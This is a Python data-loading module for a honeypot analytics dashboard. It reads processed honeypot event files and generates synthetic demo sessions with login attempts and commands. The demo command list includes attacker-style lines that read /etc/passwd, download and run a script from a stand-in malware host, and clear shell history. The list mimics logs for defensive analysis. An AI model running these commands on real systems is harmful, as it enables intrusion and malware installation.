"""
utils/data_loader.py

Data loading and preparation layer for the Honeypot Analytics Dashboard.

DATA MODES
----------
  DEMO  (Default) — Synthetic sample data used during UI development.
                    Safe to run, zero external file dependencies.
  REAL            — Real honeypot dataset loaded from data/raw/ or data/processed/.

STAGE 2A PREPARATION
--------------------
  This module provides a clean architecture for connecting an external dataset:
    1. Discovery: list_available_datasets() discovers files in data/raw/ & data/processed/
    2. Inspection: inspect_dataset() inspects columns, data types, and sample rows
    3. Ingestion: load_raw_file() safely reads CSV, JSON, Parquet, or Excel
    4. Normalization: clean_and_normalize() is ready for column mapping once inspected
    5. Entity Extraction: extract_entity_tables() builds dashboard tables
"""

import os
import random
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

import numpy as np
import pandas as pd

# ── Directory & Path Configuration ────────────────────────────────────────────
BASE_DIR = Path(__file__).resolve().parent.parent
DATA_DIR = BASE_DIR / "data"
RAW_DATA_DIR = DATA_DIR / "raw"
PROCESSED_DATA_DIR = DATA_DIR / "processed"

# Mode switch: "real" (default in Stage 2D) or "demo"
# Can also be set via environment variable HONEYPOT_DATA_MODE
DATA_MODE = os.environ.get("HONEYPOT_DATA_MODE", "real").lower()

# Default path for processed real dataset; can be overridden via HONEYPOT_DATA_PATH
REAL_DATA_PATH = Path(os.environ.get(
    "HONEYPOT_DATA_PATH",
    PROCESSED_DATA_DIR / "events.parquet"
))


# ── Public API ────────────────────────────────────────────────────────────────

def set_data_mode(mode: str) -> None:
    """Set active data mode ('real' or 'demo')."""
    global DATA_MODE
    DATA_MODE = "real" if "real" in str(mode).lower() else "demo"


def get_data_mode() -> str:
    """Return currently active data mode."""
    return DATA_MODE


def load_data(mode: str | None = None) -> dict[str, pd.DataFrame]:
    """
    Main data entry point used by all dashboard pages.

    Returns a dictionary of DataFrames:
      - 'events':       Primary event records
      - 'sessions':     Attacker session records
      - 'credentials':  Authentication attempt records
      - 'commands':     Command execution records
      - 'attackers':    Attacker summary profiles
    """
    active_mode = mode.lower() if mode else DATA_MODE
    if "real" in active_mode:
        return load_real_data()
    return _generate_demo_data()


def is_demo_mode() -> bool:
    """Check if dashboard is currently running on demo data."""
    return DATA_MODE == "demo"


def get_data_mode_label() -> str:
    """Return badge label for UI display."""
    return "⚠️ DEMO DATA (Synthetic)" if is_demo_mode() else "✅ REAL DATA (CyberLab)"


# ── Dataset Discovery & Inspection Utilities ──────────────────────────────────

def list_available_datasets() -> list[Path]:
    """
    Scan data/raw and data/processed for available dataset files.
    Supports CSV, JSON, JSONL, JSON.GZ, GZ, Parquet, and Excel formats.
    """
    extensions = ("*.csv", "*.json", "*.jsonl", "*.json.gz", "*.gz", "*.parquet", "*.xlsx", "*.xls")
    found_files: list[Path] = []
    for directory in (RAW_DATA_DIR, PROCESSED_DATA_DIR):
        if directory.exists():
            for ext in extensions:
                found_files.extend(directory.glob(ext))
    return sorted(set(found_files))


def inspect_dataset(file_path: str | Path | None = None, sample_rows: int = 5) -> dict[str, Any]:
    """
    Inspect a real dataset file without altering it.

    Returns metadata dictionary containing:
      - 'file_path':        Path to inspected file
      - 'file_size_bytes':  File size on disk
      - 'total_columns':    Number of columns
      - 'columns':          List of column names
      - 'dtypes':           Mapping of column names to inferred data types
      - 'sample_data':      First N records as dictionary
      - 'null_counts':      Count of missing/null values per column
    """
    target = Path(file_path) if file_path else _resolve_dataset_path()
    if not target.exists():
        raise FileNotFoundError(
            f"Dataset not found at: {target}\n"
            f"Please place your dataset file in '{RAW_DATA_DIR}' or '{PROCESSED_DATA_DIR}'."
        )

    # For inspection, load a representative sample so even large files inspect instantly
    raw_df = load_raw_file(target, max_events=1000)

    return {
        "file_path": str(target),
        "file_size_bytes": target.stat().st_size,
        "total_rows_loaded": len(raw_df),
        "total_columns": len(raw_df.columns),
        "columns": list(raw_df.columns),
        "dtypes": {col: str(dtype) for col, dtype in raw_df.dtypes.items()},
        "sample_data": raw_df.head(sample_rows).to_dict(orient="records"),
        "null_counts": raw_df.isnull().sum().to_dict(),
    }


def load_raw_file(file_path: str | Path, max_events: int | None = None) -> pd.DataFrame:
    """
    Load a raw dataset file into a pandas DataFrame based on its extension.
    Supports .csv, .json, .jsonl, .json.gz, .gz, .parquet, .xlsx, .xls.
    """
    path = Path(file_path)
    name = path.name.lower()
    suffix = path.suffix.lower()

    if name.endswith(".json.gz") or suffix == ".gz":
        import gzip
        import json
        records = []
        with gzip.open(path, "rt", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith("["):
                    line = line[1:].strip()
                if line.endswith("]"):
                    line = line[:-1].strip()
                if line.endswith(","):
                    line = line[:-1].strip()
                if not line:
                    continue
                try:
                    obj = json.loads(line)
                except Exception:
                    continue
                if isinstance(obj, dict):
                    # Check if session-grouped: {"<session_id>": [events]}
                    for k, v in obj.items():
                        if isinstance(v, list):
                            for ev in v:
                                if isinstance(ev, dict):
                                    records.append(ev)
                                    if max_events and len(records) >= max_events:
                                        return pd.DataFrame(records)
                        else:
                            records.append(obj)
                            if max_events and len(records) >= max_events:
                                return pd.DataFrame(records)
                            break
                elif isinstance(obj, list):
                    for ev in obj:
                        if isinstance(ev, dict):
                            records.append(ev)
                            if max_events and len(records) >= max_events:
                                return pd.DataFrame(records)
        return pd.DataFrame(records)
    elif suffix == ".csv":
        return pd.read_csv(path, nrows=max_events, low_memory=False)
    elif suffix in (".json", ".jsonl"):
        lines = suffix == ".jsonl"
        return pd.read_json(path, lines=lines, nrows=max_events)
    elif suffix == ".parquet":
        return pd.read_parquet(path)
    elif suffix in (".xlsx", ".xls"):
        return pd.read_excel(path, nrows=max_events)
    else:
        return pd.read_csv(path, nrows=max_events, low_memory=False)


# ── Real Data Pipeline Hooks (Stage 2B Ready) ─────────────────────────────────

def clean_and_normalize(raw_df: pd.DataFrame, column_mapping: dict[str, str] | None = None) -> pd.DataFrame:
    """
    Clean and normalize raw honeypot events into the dashboard's internal representation.

    Note: Column mapping is intentionally NOT hardcoded yet.
    Once the real dataset is provided and inspected via inspect_dataset(),
    the actual field mapping and type conversion rules will be added here.
    """
    df = raw_df.copy()

    # Apply explicit column mapping if provided
    if column_mapping:
        df = df.rename(columns=column_mapping)

    # Preserve indication that this is real data
    df["is_demo"] = False

    return df


def extract_entity_tables(events_df: pd.DataFrame) -> dict[str, pd.DataFrame]:
    """
    Construct entity-specific tables (sessions, credentials, commands)
    from the normalized events DataFrame.

    Adapts gracefully based on available columns in the normalized dataset.
    """
    # 1. Sessions table
    sessions = pd.DataFrame()
    if "session_id" in events_df.columns and "source_ip" in events_df.columns:
        sessions = (
            events_df.groupby(["session_id", "source_ip"], as_index=False)
            .agg(
                session_count=("session_id", "count"),
                first_seen=("timestamp", "min") if "timestamp" in events_df.columns else ("session_id", "first"),
                last_seen=("timestamp", "max") if "timestamp" in events_df.columns else ("session_id", "first"),
            )
        )
    elif "source_ip" in events_df.columns:
        sessions = (
            events_df.groupby("source_ip", as_index=False)
            .agg(
                session_count=("source_ip", "count"),
                first_seen=("timestamp", "min") if "timestamp" in events_df.columns else ("source_ip", "first"),
                last_seen=("timestamp", "max") if "timestamp" in events_df.columns else ("source_ip", "first"),
            )
        )

    # 2. Credentials table
    credentials = pd.DataFrame()
    cred_cols = [c for c in ["timestamp", "source_ip", "country", "username", "password", "login_success"] if c in events_df.columns]
    if cred_cols:
        if "event_type" in events_df.columns:
            auth_events = events_df[events_df["event_type"].astype(str).str.contains("login|auth", case=False, na=False)]
            credentials = auth_events[cred_cols].copy() if not auth_events.empty else events_df[cred_cols].copy()
        else:
            credentials = events_df[cred_cols].copy()

    # 3. Commands table
    commands = pd.DataFrame()
    cmd_cols = [c for c in ["timestamp", "source_ip", "country", "username", "command"] if c in events_df.columns]
    if "command" in events_df.columns:
        commands = events_df.dropna(subset=["command"])[cmd_cols].copy()

    return {
        "events": events_df,
        "sessions": sessions,
        "credentials": credentials,
        "commands": commands,
    }


def load_real_data(force_reprocess: bool = False) -> dict[str, pd.DataFrame]:
    """
    Load real honeypot dataset from optimized Parquet files in data/processed/.
    If Parquet files do not exist, runs the preprocessing pipeline once.
    Ensures the 1.37M raw events are never re-parsed on dashboard re-runs.
    """
    from utils.preprocess import process_cyberlab_dataset

    events_pq = PROCESSED_DATA_DIR / "events.parquet"
    sessions_pq = PROCESSED_DATA_DIR / "sessions.parquet"
    creds_pq = PROCESSED_DATA_DIR / "credentials.parquet"
    cmds_pq = PROCESSED_DATA_DIR / "commands.parquet"
    attackers_pq = PROCESSED_DATA_DIR / "attackers.parquet"

    if force_reprocess or not (events_pq.exists() and sessions_pq.exists() and creds_pq.exists() and cmds_pq.exists()):
        process_cyberlab_dataset(force=force_reprocess)

    df_events = pd.read_parquet(events_pq)
    df_sessions = pd.read_parquet(sessions_pq)
    df_creds = pd.read_parquet(creds_pq)
    df_cmds = pd.read_parquet(cmds_pq)
    df_attackers = pd.read_parquet(attackers_pq) if attackers_pq.exists() else pd.DataFrame()

    # Provide standardized alias columns so views can use both real and generic field names
    df_events["source_ip"] = df_events["src_ip_identifier"]
    df_events["country"] = df_events["country_name"].fillna("Unknown")
    df_events["country_code"] = df_events["country_code2"].fillna("XX")
    df_events["event_type"] = df_events["eventid"]
    df_events["is_demo"] = False

    df_sessions["source_ip"] = df_sessions["src_ip_identifier"]
    df_sessions["country"] = df_sessions["country_name"].fillna("Unknown")
    df_sessions["country_code"] = df_sessions["country_code2"].fillna("XX")
    df_sessions["session_count"] = df_sessions["event_count"]
    df_sessions["first_seen"] = df_sessions["start_time"]
    df_sessions["last_seen"] = df_sessions["end_time"]
    df_sessions["is_demo"] = False

    df_creds["source_ip"] = df_creds["src_ip_identifier"]
    df_creds["country"] = df_creds["country_name"].fillna("Unknown")
    df_creds["country_code"] = df_creds["country_code2"].fillna("XX")
    df_creds["is_demo"] = False

    df_cmds["source_ip"] = df_cmds["src_ip_identifier"]
    df_cmds["country"] = df_cmds["country_name"].fillna("Unknown")
    df_cmds["country_code"] = df_cmds["country_code2"].fillna("XX")
    df_cmds["is_demo"] = False

    if not df_attackers.empty:
        df_attackers["source_ip"] = df_attackers["src_ip_identifier"]
        df_attackers["country"] = df_attackers["country_name"].fillna("Unknown")
        df_attackers["country_code"] = df_attackers["country_code2"].fillna("XX")
        df_attackers["is_demo"] = False

    return {
        "events": df_events,
        "sessions": df_sessions,
        "credentials": df_creds,
        "commands": df_cmds,
        "attackers": df_attackers,
    }


def _resolve_dataset_path() -> Path:
    """Find the configured or first available real dataset file."""
    if REAL_DATA_PATH.exists():
        return REAL_DATA_PATH

    available = list_available_datasets()
    if available:
        return available[0]

    return REAL_DATA_PATH


# ── Demo Data Generator (Unchanged Foundation) ────────────────────────────────

def _generate_demo_data() -> dict[str, pd.DataFrame]:
    """
    Generate small, clearly-labelled mock dataset for UI development.
    Values are plausible but entirely fictional.
    """
    rng = np.random.default_rng(42)
    random.seed(42)

    n_events = 400
    n_attackers = 18
    days = 30
    end_dt = datetime(2024, 3, 31, 23, 59, 59)
    start_dt = end_dt - timedelta(days=days)

    countries = [
        ("China", "CN", 35.86, 104.19),
        ("Russia", "RU", 61.52, 105.31),
        ("United States", "US", 37.09, -95.71),
        ("Germany", "DE", 51.16, 10.45),
        ("Netherlands", "NL", 52.13, 5.29),
        ("Brazil", "BR", -14.23, -51.92),
        ("India", "IN", 20.59, 78.96),
        ("Ukraine", "UA", 48.38, 31.17),
        ("Vietnam", "VN", 14.06, 108.28),
        ("Romania", "RO", 45.94, 24.96),
    ]
    country_weights = [0.25, 0.20, 0.10, 0.08, 0.07, 0.07, 0.06, 0.07, 0.05, 0.05]

    usernames = ["root", "admin", "ubuntu", "pi", "user", "test", "guest",
                 "oracle", "postgres", "tomcat", "vagrant", "git", "deploy"]
    passwords = ["123456", "password", "admin", "root", "letmein", "qwerty",
                 "abc123", "12345678", "raspberry", "changeme", "test"]
    event_types = ["login_attempt", "login_success", "command", "session_start", "session_end"]
    et_weights = [0.55, 0.05, 0.20, 0.10, 0.10]
    protocols = ["SSH", "Telnet"]
    proto_w = [0.88, 0.12]

    def rand_ip():
        return f"{rng.integers(1,254)}.{rng.integers(0,255)}.{rng.integers(0,255)}.{rng.integers(1,254)}"

    attacker_ips = [rand_ip() for _ in range(n_attackers)]
    ip_country = {ip: random.choices(countries, weights=country_weights)[0] for ip in attacker_ips}

    cmd_list = [
        "whoami", "id", "uname -a", "cat /etc/passwd", "ls -la",
        "ifconfig", "wget http://malware.example.com/bot.sh",
        "chmod +x bot.sh", "./bot.sh", "history -c"
    ]

    # Generate 35 stable synthetic sessions across the 18 attackers
    n_demo_sessions = 35
    demo_session_ids = [f"demo_sess_{i+1:03d}" for i in range(n_demo_sessions)]
    sess_to_ip = {sid: attacker_ips[i % n_attackers] for i, sid in enumerate(demo_session_ids)}

    base_times = [
        start_dt + timedelta(seconds=int(rng.integers(0, days * 86400)))
        for _ in range(n_demo_sessions)
    ]
    base_times.sort()

    records = []

    for sid, base_t in zip(demo_session_ids, base_times):
        ip = sess_to_ip[sid]
        c_info = ip_country[ip]
        proto = random.choices(protocols, weights=proto_w)[0]
        lat = c_info[2] + float(rng.uniform(-2, 2))
        lon = c_info[3] + float(rng.uniform(-2, 2))

        t_curr = base_t

        # 1. session_start
        records.append({
            "timestamp": t_curr,
            "session_id": sid,
            "source_ip": ip,
            "src_ip_identifier": ip,
            "country": c_info[0],
            "country_name": c_info[0],
            "country_code": c_info[1],
            "country_code2": c_info[1],
            "latitude": lat,
            "longitude": lon,
            "event_type": "session_start",
            "eventid": "cowrie.session.connect",
            "protocol": proto,
            "username": None,
            "password": None,
            "login_success": False,
            "is_demo": True,
            "command": None,
        })

        # 2. Failed login attempts (1 to 10 attempts)
        n_fails = int(rng.integers(1, 8))
        if sid in ["demo_sess_001", "demo_sess_002", "demo_sess_003"]:
            n_fails = 12  # Guarantees Rule A candidates (>= 10 failures)

        # For demo_sess_001 and demo_sess_019 (attacker 0), inject a password spraying pattern
        # using the same password across 6 distinct usernames to ensure Rule B candidate exists
        if sid == "demo_sess_001":
            spray_users = ["root", "admin", "ubuntu", "user", "test", "oracle"]
            for u in spray_users:
                t_curr += timedelta(seconds=float(rng.uniform(1.0, 3.0)))
                records.append({
                    "timestamp": t_curr,
                    "session_id": sid,
                    "source_ip": ip,
                    "src_ip_identifier": ip,
                    "country": c_info[0],
                    "country_name": c_info[0],
                    "country_code": c_info[1],
                    "country_code2": c_info[1],
                    "latitude": lat,
                    "longitude": lon,
                    "event_type": "login_attempt",
                    "eventid": "cowrie.login.failed",
                    "protocol": proto,
                    "username": u,
                    "password": "password123",
                    "login_success": False,
                    "is_demo": True,
                    "command": None,
                })
        else:
            for _ in range(n_fails):
                t_curr += timedelta(seconds=float(rng.uniform(1.0, 3.5)))
                u = random.choice(usernames)
                p = random.choice(passwords)
                records.append({
                    "timestamp": t_curr,
                    "session_id": sid,
                    "source_ip": ip,
                    "src_ip_identifier": ip,
                    "country": c_info[0],
                    "country_name": c_info[0],
                    "country_code": c_info[1],
                    "country_code2": c_info[1],
                    "latitude": lat,
                    "longitude": lon,
                    "event_type": "login_attempt",
                    "eventid": "cowrie.login.failed",
                    "protocol": proto,
                    "username": u,
                    "password": p,
                    "login_success": False,
                    "is_demo": True,
                    "command": None,
                })

        # 3. Successful login (chronologically after failures)
        has_succ = (rng.random() < 0.35) or (sid in ["demo_sess_007", "demo_sess_010", "demo_sess_014", "demo_sess_020"])
        if has_succ:
            t_curr += timedelta(seconds=float(rng.uniform(1.5, 4.0)))
            u = random.choice(usernames)
            p = random.choice(passwords)
            records.append({
                "timestamp": t_curr,
                "session_id": sid,
                "source_ip": ip,
                "src_ip_identifier": ip,
                "country": c_info[0],
                "country_name": c_info[0],
                "country_code": c_info[1],
                "country_code2": c_info[1],
                "latitude": lat,
                "longitude": lon,
                "event_type": "login_success",
                "eventid": "cowrie.login.success",
                "protocol": proto,
                "username": u,
                "password": p,
                "login_success": True,
                "is_demo": True,
                "command": None,
            })

            # 4. Commands (strictly post-authentication only)
            n_cmds = int(rng.integers(1, 5))
            for _ in range(n_cmds):
                t_curr += timedelta(seconds=float(rng.uniform(0.5, 2.5)))
                cmd = random.choice(cmd_list)
                records.append({
                    "timestamp": t_curr,
                    "session_id": sid,
                    "source_ip": ip,
                    "src_ip_identifier": ip,
                    "country": c_info[0],
                    "country_name": c_info[0],
                    "country_code": c_info[1],
                    "country_code2": c_info[1],
                    "latitude": lat,
                    "longitude": lon,
                    "event_type": "command",
                    "eventid": "cowrie.command.input",
                    "protocol": proto,
                    "username": u,
                    "password": None,
                    "login_success": False,
                    "is_demo": True,
                    "command": cmd,
                })

        # 5. session_end
        t_curr += timedelta(seconds=float(rng.uniform(1.0, 5.0)))
        records.append({
            "timestamp": t_curr,
            "session_id": sid,
            "source_ip": ip,
            "src_ip_identifier": ip,
            "country": c_info[0],
            "country_name": c_info[0],
            "country_code": c_info[1],
            "country_code2": c_info[1],
            "latitude": lat,
            "longitude": lon,
            "event_type": "session_end",
            "eventid": "cowrie.session.closed",
            "protocol": proto,
            "username": None,
            "password": None,
            "login_success": False,
            "is_demo": True,
            "command": None,
        })

    events = pd.DataFrame(records)

    # Sessions aggregated consistently from events: count only login_attempt as failed_logins
    sessions = (
        events.groupby("session_id", as_index=False)
        .agg(
            source_ip=("source_ip", "first"),
            src_ip_identifier=("src_ip_identifier", "first"),
            country=("country", "first"),
            country_name=("country_name", "first"),
            country_code=("country_code", "first"),
            country_code2=("country_code2", "first"),
            first_seen=("timestamp", "min"),
            last_seen=("timestamp", "max"),
            start_time=("timestamp", "min"),
            end_time=("timestamp", "max"),
            event_count=("event_type", "count"),
            failed_logins=("event_type", lambda s: int((s == "login_attempt").sum())),
            successful_logins=("event_type", lambda s: int((s == "login_success").sum())),
            command_count=("event_type", lambda s: int((s == "command").sum())),
        )
    )

    sessions["duration"] = [float(round(max(0.5, (r["end_time"] - r["start_time"]).total_seconds()), 2)) for _, r in sessions.iterrows()]
    sessions["has_login_success"] = sessions["successful_logins"] > 0
    sessions["session_count"] = 1

    credentials = events[events["event_type"].isin(["login_attempt", "login_success"])][
        ["timestamp", "session_id", "source_ip", "src_ip_identifier", "country", "country_name", "username", "password", "login_success"]
    ].copy()

    commands = events[events["event_type"] == "command"][
        ["timestamp", "session_id", "source_ip", "src_ip_identifier", "country", "country_name", "username", "command"]
    ].copy()

    demo_attackers = (
        events.groupby(["source_ip", "country", "country_code"], as_index=False)
        .agg(
            first_seen=("timestamp", "min"),
            last_seen=("timestamp", "max"),
            total_events=("timestamp", "count"),
        )
    )
    demo_attackers["src_ip_identifier"] = demo_attackers["source_ip"]
    demo_attackers["country_name"] = demo_attackers["country"]
    demo_attackers["country_code2"] = demo_attackers["country_code"]

    # Calculate attacker aggregates from sessions
    att_stats = sessions.groupby("src_ip_identifier").agg(
        total_sessions=("session_id", "count"),
        failed_logins=("failed_logins", "sum"),
        successful_logins=("successful_logins", "sum"),
        total_commands=("command_count", "sum"),
    ).reset_index()
    demo_attackers = demo_attackers.merge(att_stats, on="src_ip_identifier", how="left").fillna(0)

    return {
        "events": events,
        "sessions": sessions,
        "credentials": credentials,
        "commands": commands,
        "attackers": demo_attackers,
    }
